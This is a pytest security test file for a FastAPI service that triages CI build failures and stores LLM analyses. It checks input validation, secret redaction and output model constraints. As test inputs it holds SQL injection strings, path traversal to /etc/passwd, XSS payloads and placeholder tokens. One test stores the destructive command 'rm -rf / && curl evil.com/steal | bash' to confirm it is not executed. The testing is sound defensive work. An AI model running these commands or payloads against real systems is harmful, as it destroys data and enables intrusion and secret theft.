"""Security tests: input validation, secret exposure prevention, LLM output safety."""

import os
import sys
from datetime import datetime
from unittest.mock import MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from api.errors import register_error_handlers
from api.routes import mount_routes

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_REPO_PATCH_TARGETS = [
    'repositories.repository_factory.get_repository',
    'api.routes.failures.get_repository',
    'api.routes.violations.get_repository',
    'api.routes.releases.get_repository',
    'api.routes.triage.get_repository',
]


def _mock_repo():
    """Return a MagicMock suitable for patching get_repository."""
    mock = MagicMock()
    mock.get_failure_details.return_value = None
    mock.get_triage_summary.return_value = {
        'total': 0, 'failing': 0, 'working': 0, 'failing_components': [],
    }
    mock.get_violation_details.return_value = None
    mock.get_violation_summaries.return_value = []
    mock.find_unresolved_component_names.return_value = []
    mock.get_applications.return_value = []
    mock.get_overview_stats.return_value = {'components': 0, 'total': 0}
    mock.get_working_components.return_value = []
    mock.get_resolved_components.return_value = []
    mock.get_recent_analyses.return_value = []
    mock.get_component_history.return_value = {'summary': {}, 'builds': []}
    mock.get_analysis_by_component.return_value = None
    mock.build_jira_map.return_value = {}
    return mock


@pytest.fixture
def patched_repo():
    """Patch get_repository in all route modules and the factory."""
    repo = _mock_repo()
    patches = []
    for target in _REPO_PATCH_TARGETS:
        try:
            p = patch(target, return_value=repo)
            p.start()
            patches.append(p)
        except (AttributeError, ModuleNotFoundError):
            pass
    yield repo
    for p in patches:
        p.stop()


def _make_client():
    """Create a fresh FastAPI TestClient with error handlers and routes."""
    app = FastAPI()
    register_error_handlers(app)
    mount_routes(app)
    return TestClient(app, raise_server_exceptions=False)


# ===========================================================================
# 1. API Input Validation (~10 tests)
# ===========================================================================

class TestSQLInjectionPrevention:
    """SQL injection attempts should be treated as invalid input, not crash."""

    def test_sql_injection_in_failure_component(self, patched_repo):
        client = _make_client()
        resp = client.get("/api/v1/applications/test-app/failures/'; DROP TABLE --")
        assert resp.status_code in (200, 404, 422), \
            "SQL injection caused server crash: {}".format(resp.status_code)
        assert resp.status_code != 500

    def test_sql_injection_in_application_name(self, patched_repo):
        client = _make_client()
        resp = client.get("/api/v1/applications/'; DROP TABLE failures;--/failures")
        assert resp.status_code in (200, 404, 422)
        assert resp.status_code != 500

    def test_union_select_injection(self, patched_repo):
        client = _make_client()
        resp = client.get(
            "/api/v1/applications/test' UNION SELECT * FROM users--/failures"
        )
        assert resp.status_code != 500


class TestPathTraversal:
    """Path traversal attempts should not escape the application layer."""

    def test_path_traversal_in_application(self, patched_repo):
        client = _make_client()
        resp = client.get("/api/v1/applications/../../etc/passwd/failures")
        assert resp.status_code in (200, 404, 422)
        assert resp.status_code != 500
        assert '/etc/passwd' not in resp.text or 'root:' not in resp.text

    def test_path_traversal_in_component(self, patched_repo):
        client = _make_client()
        resp = client.get("/api/v1/applications/test-app/failures/..%2F..%2Fetc%2Fpasswd")
        assert resp.status_code != 500


class TestMalformedInput:
    """Malformed and oversized inputs should be handled gracefully."""

    def test_very_long_component_name(self, patched_repo):
        client = _make_client()
        long_name = 'a' * 10000
        resp = client.get("/api/v1/applications/test-app/failures/{}".format(long_name))
        assert resp.status_code != 500

    def test_null_bytes_in_component(self, patched_repo):
        client = _make_client()
        resp = client.get("/api/v1/applications/test-app/failures/comp%00onent")
        assert resp.status_code != 500

    def test_unicode_emoji_in_application(self, patched_repo):
        client = _make_client()
        resp = client.get("/api/v1/applications/test-app-\U0001f4a9/failures")
        assert resp.status_code in (200, 404, 422)
        assert resp.status_code != 500

    def test_xss_in_component_name(self, patched_repo):
        client = _make_client()
        resp = client.get(
            "/api/v1/applications/test-app/failures/<script>alert(1)</script>"
        )
        assert resp.status_code != 500
        if resp.status_code == 200 and resp.text:
            assert '<script>' not in resp.text

    def test_json_injection_in_query_param(self, patched_repo):
        client = _make_client()
        resp = client.get(
            '/api/v1/applications/test-app/failures',
            params={'limit': '1; DROP TABLE failures'},
        )
        assert resp.status_code == 422


# ===========================================================================
# 2. Secret Exposure Prevention (~8 tests)
# ===========================================================================

class TestErrorHandlerSecretSafety:
    """Error responses must not leak sensitive configuration."""

    def test_db_error_no_connection_string(self):
        error_msg = "connection to postgresql://admin:FAKE_PASS@db-host:5432/cidb failed"  # noqa: S105
        patches = []
        for target in _REPO_PATCH_TARGETS:
            try:
                p = patch(target, side_effect=Exception(error_msg))
                p.start()
                patches.append(p)
            except (AttributeError, ModuleNotFoundError):
                pass
        try:
            client = _make_client()
            resp = client.get("/api/v1/applications")
            body = resp.text
            assert 'admin:FAKE_PASS' not in body, "DB credentials leaked in error response"
            assert 'postgresql://' not in body, "Connection URI leaked in error response"
        finally:
            for p in patches:
                p.stop()

    def test_error_no_api_tokens(self):
        error_msg = "JIRA_TOKEN=xoxb-1234-abcdef was invalid"
        patches = []
        for target in _REPO_PATCH_TARGETS:
            try:
                p = patch(target, side_effect=Exception(error_msg))
                p.start()
                patches.append(p)
            except (AttributeError, ModuleNotFoundError):
                pass
        try:
            client = _make_client()
            resp = client.get("/api/v1/applications")
            body = resp.text
            assert 'xoxb-1234-abcdef' not in body, "API token leaked in error response"
        finally:
            for p in patches:
                p.stop()

    def test_error_no_github_token(self):
        error_msg = "Failed with key=ghp_FAKE_TOKEN_FOR_TESTING_ONLY_000"  # noqa: S105
        patches = []
        for target in _REPO_PATCH_TARGETS:
            try:
                p = patch(target, side_effect=Exception(error_msg))
                p.start()
                patches.append(p)
            except (AttributeError, ModuleNotFoundError):
                pass
        try:
            client = _make_client()
            resp = client.get("/api/v1/applications")
            body = resp.text
            assert 'ghp_FAKE_TOKEN' not in body, "GitHub token leaked in error response"
        finally:
            for p in patches:
                p.stop()

    def test_unhandled_exception_returns_500_not_traceback(self):
        """Unhandled exceptions should return 500, not a full stack trace with source."""
        app = FastAPI()
        register_error_handlers(app)

        from fastapi import APIRouter
        r = APIRouter()

        @r.get("/crash")
        def crash():
            secret = "sk-ant-api03-secret-key-here"  # noqa: S105, F841
            raise RuntimeError("internal failure with sensitive context")

        app.include_router(r)
        client = TestClient(app, raise_server_exceptions=False)
        resp = client.get("/crash")
        assert resp.status_code == 500
        # FastAPI's default 500 should not include the variable name
        assert 'sk-ant-api03' not in resp.text


class TestPydanticModelExclusion:
    """Pydantic models should not expose internal/sensitive fields."""

    def test_build_failure_details_no_raw_db_id(self):
        """BuildFailureDetails model has no 'id' field that could expose DB row IDs."""
        from mcp_server.models import BuildFailureDetails
        field_names = set(BuildFailureDetails.model_fields.keys())
        # The model should not have a raw 'id' field
        assert 'id' not in field_names, "Raw DB id field exposed in API model"
        assert 'db_id' not in field_names, "Raw DB id field exposed in API model"

    def test_analysis_details_no_internal_fields(self):
        """AnalysisDetails should not expose internal fields like failure_id."""
        from mcp_server.models import AnalysisDetails
        field_names = set(AnalysisDetails.model_fields.keys())
        assert 'build_failure_id' not in field_names
        assert 'conforma_result_id' not in field_names
        assert 'internal_notes' not in field_names

    def test_build_logs_field_is_optional(self):
        """build_logs should be optional so it can be excluded from responses."""
        from mcp_server.models import BuildFailureDetails
        field = BuildFailureDetails.model_fields['build_logs']
        # Field should allow None (Optional)
        assert field.default is None, "build_logs should default to None for safe exclusion"

    def test_jira_token_health_no_raw_token(self):
        """JiraTokenHealth should report status, not include the actual token."""
        from mcp_server.models import JiraTokenHealth
        field_names = set(JiraTokenHealth.model_fields.keys())
        assert 'token' not in field_names, "Raw token field exposed in health model"
        assert 'api_key' not in field_names


# ===========================================================================
# 3. LLM Response Safety (~5 tests)
# ===========================================================================

class TestLLMOutputSafety:
    """LLM analysis output is properly validated and constrained."""

    def test_confidence_score_rejects_above_one(self):
        """confidence_score > 1.0 should be rejected by Pydantic."""
        from pydantic import ValidationError

        from mcp_server.models import AnalysisDetails
        with pytest.raises(ValidationError) as exc_info:
            AnalysisDetails(
                type='build',
                component='test-component',
                model_used='claude-sonnet-4-20250514',
                root_cause='test root cause',
                failure_category='build_error',
                confidence_score=1.5,
                recommended_fix='fix it',
                recommended_files=[],
                can_auto_fix=False,
                requires_human_review=True,
                analyzed_at=datetime.utcnow(),
                tokens_used=100,
                cost_usd=0.01,
            )
        errors = exc_info.value.errors()
        assert any('confidence_score' in str(e) for e in errors)

    def test_confidence_score_rejects_negative(self):
        """confidence_score < 0.0 should be rejected by Pydantic."""
        from pydantic import ValidationError

        from mcp_server.models import AnalysisDetails
        with pytest.raises(ValidationError):
            AnalysisDetails(
                type='build',
                component='test-component',
                model_used='test',
                root_cause='test',
                failure_category='test',
                confidence_score=-0.5,
                recommended_fix='fix',
                recommended_files=[],
                can_auto_fix=False,
                requires_human_review=True,
                analyzed_at=datetime.utcnow(),
                tokens_used=0,
                cost_usd=0.0,
            )

    def test_analysis_type_restricted_to_literal(self):
        """type field only allows 'build' or 'conforma'."""
        from pydantic import ValidationError

        from mcp_server.models import AnalysisDetails
        with pytest.raises(ValidationError):
            AnalysisDetails(
                type='malicious_type',
                component='test',
                model_used='test',
                root_cause='test',
                failure_category='test',
                confidence_score=0.5,
                recommended_fix='fix',
                recommended_files=[],
                can_auto_fix=False,
                requires_human_review=True,
                analyzed_at=datetime.utcnow(),
                tokens_used=0,
                cost_usd=0.0,
            )

    def test_html_in_root_cause_preserved_as_string(self):
        """HTML in root_cause is stored as a plain string, not interpreted."""
        from mcp_server.models import AnalysisDetails
        malicious_html = '<script>alert("xss")</script><img src=x onerror=alert(1)>'
        analysis = AnalysisDetails(
            type='build',
            component='test',
            model_used='test',
            root_cause=malicious_html,
            failure_category='build_error',
            confidence_score=0.8,
            recommended_fix='fix it',
            recommended_files=[],
            can_auto_fix=False,
            requires_human_review=True,
            analyzed_at=datetime.utcnow(),
            tokens_used=100,
            cost_usd=0.01,
        )
        # Value is stored as-is (plain string), which is safe for JSON serialization
        assert analysis.root_cause == malicious_html
        # When serialized to JSON, it will be escaped by the JSON encoder
        json_output = analysis.model_dump_json()
        # Raw <script> tag must be JSON-escaped (as < or similar) or quoted
        assert '<script>' not in json_output or '"<script>' in json_output

    def test_recommended_fix_shell_commands_not_executed(self):
        """Shell commands in recommended_fix are stored as strings, not executed."""
        from mcp_server.models import AnalysisDetails
        dangerous_fix = 'rm -rf / && curl evil.com/steal | bash'
        analysis = AnalysisDetails(
            type='build',
            component='test',
            model_used='test',
            root_cause='test',
            failure_category='test',
            confidence_score=0.5,
            recommended_fix=dangerous_fix,
            recommended_files=['Dockerfile'],
            can_auto_fix=False,
            requires_human_review=True,
            analyzed_at=datetime.utcnow(),
            tokens_used=0,
            cost_usd=0.0,
        )
        # The fix is stored as a string, not interpreted or executed
        assert analysis.recommended_fix == dangerous_fix
        assert analysis.requires_human_review is True


# ===========================================================================
# 4. Input Validator Unit Tests
# ===========================================================================

class TestValidatorFunctions:
    """Direct tests for the validation functions in api.validators."""

    def test_validate_application_rejects_sql(self):
        from api.errors import ICError
        from api.validators import validate_application_name
        with pytest.raises(ICError) as exc_info:
            validate_application_name("'; DROP TABLE --")
        assert exc_info.value.status_code == 422

    def test_validate_application_rejects_empty(self):
        from api.errors import ICError
        from api.validators import validate_application_name
        with pytest.raises(ICError):
            validate_application_name("")

    def test_validate_application_rejects_spaces(self):
        from api.errors import ICError
        from api.validators import validate_application_name
        with pytest.raises(ICError):
            validate_application_name("app name with spaces")

    def test_validate_application_accepts_valid(self):
        from api.validators import validate_application_name
        result = validate_application_name("rhoai-v3-5-ea-2")
        assert result == "rhoai-v3-5-ea-2"

    def test_validate_jira_key_rejects_injection(self):
        from api.errors import ICError
        from api.validators import validate_jira_key
        with pytest.raises(ICError):
            validate_jira_key("'; DROP TABLE --")

    def test_validate_jira_key_accepts_valid(self):
        from api.validators import validate_jira_key
        result = validate_jira_key("RHOAIENG-12345")
        assert result == "RHOAIENG-12345"
